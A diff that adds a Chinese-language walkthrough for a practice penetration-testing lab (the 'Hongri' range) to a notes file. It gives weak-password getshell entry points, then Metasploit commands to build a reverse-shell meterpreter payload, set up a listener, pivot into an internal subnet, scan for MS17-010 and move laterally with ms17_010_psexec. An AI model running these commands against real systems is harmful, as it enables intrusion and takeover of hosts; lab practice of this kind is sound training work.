@@ -426,5 +426,45 @@ AdFind -sc gpodmp
 
 0x08. 案例分析
 ----
+#### 1.红日的第一套靶场个人通过指南
 
-    
+
+
+```
+1.网络结构
+  
+2.题目2个入口phpmyadmin弱口令通过修改日志getshell；yxcms弱口令后台getshell。
+3.使用msf生成后门上传至服务器并执行：msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.101.66 LPORT=1234 -f exe > shell.exe
+  设置监听：
+  use exploit/multi/handler
+  set payload windows/meterpreter/reverse_tcp
+  set lhost 192.168.101.66
+  set lport 1234
+  run
+  
+  添加路由：
+  查看路由 
+  meterpreter > run get_local_subnets
+  可以获悉内网网段地址为：192.168.52.0/24
+  添加目标网段路由
+  meterpreter > run autoroute -s 192.168.52.0/24
+  查看路由
+  run autoroute -p
+  
+  ms17010 扫描
+  use auxiliary/scanner/smb/smb_ms17_010 
+  show options
+  set rhosts 192.168.52.0/24
+  set threads 20
+  run
+  
+  
+  使用exp横向渗透192.168.101.138的主机：
+  msf exploit(handler) > use exploit/windows/smb/ms17_010_psexec  
+  msf exploit(ms17_010_eternalblue) > set payload windows/meterpreter/bind_tcp (目标不出网，设置正向shell)
+  msf exploit(ms17_010_eternalblue) > set rhost 192.168.101.138
+  msf exploit(ms17_010_eternalblue) > exploit
+  
+4.
+
+```    
